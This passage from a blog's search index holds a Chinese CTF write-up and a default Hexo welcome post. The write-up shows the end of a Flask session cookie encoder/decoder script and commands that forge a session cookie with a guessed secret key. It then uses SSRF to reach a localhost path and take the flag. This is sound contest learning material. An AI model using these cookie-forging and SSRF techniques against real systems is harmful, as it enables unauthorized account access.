             <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure><p>首先对原始session进行解密：</p><p>在终端输入命令行启动 -s后面接的是密钥 我们推测是这个名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -s <span class="string">&quot;zxk1ing&quot;</span> -c <span class="string">&quot;eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJqb2tlciJ9.ZVmUuQ.FGqtCpSwv-lmNqDzTIFxpoS66Ck&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;zxk1ing&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;joker&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到存在关键词username</p><p>把username改成<code>zxk1ing</code></p><p>然后加密 生成伪造的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session.py encode -s <span class="string">&quot;zxk1ing&quot;</span> -t <span class="string">&quot;&#123;&#x27;key&#x27;: &#x27;zxk1ing&#x27;, &#x27;username&#x27;: &#x27;zxk1ing&#x27;&#125;&quot;</span>                   </span><br><span class="line">eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVmW3A.Vp7Tyn1njNuyFxSO4TPpoqC__qk</span><br></pre></td></tr></table></figure><p>替换原来session后成功进入</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119131909449.png" alt="image-20231119131909449"></p><p>然后访问<code>/P1aceuWillneverkn0w</code> 进入之后只有一张图片</p><p>意料之外</p><p>既然里面加了引号 肯定是有节目的</p><p>查看一下这个图片的地址</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215745106.png" alt="image-20231119215745106"></p><p>考虑到==ssrf==</p><p>把他复制然后访问</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215813666.png" alt="image-20231119215813666"></p><p>前面会自动拼接题目的网址 后面跟图片的URL</p><p>然后根据本地的特性提醒</p><p>我们去访问<code>127.0.0.1/P1aceuWillneverkn0w</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215920527.png" alt="image-20231119215920527"></p><p>成功获得flag ： <code>HECTF&#123;04800e5c552a70de9ef7a9cd00a26c90c107e010&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/21/hello-world/"/>
      <url>/2023/11/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
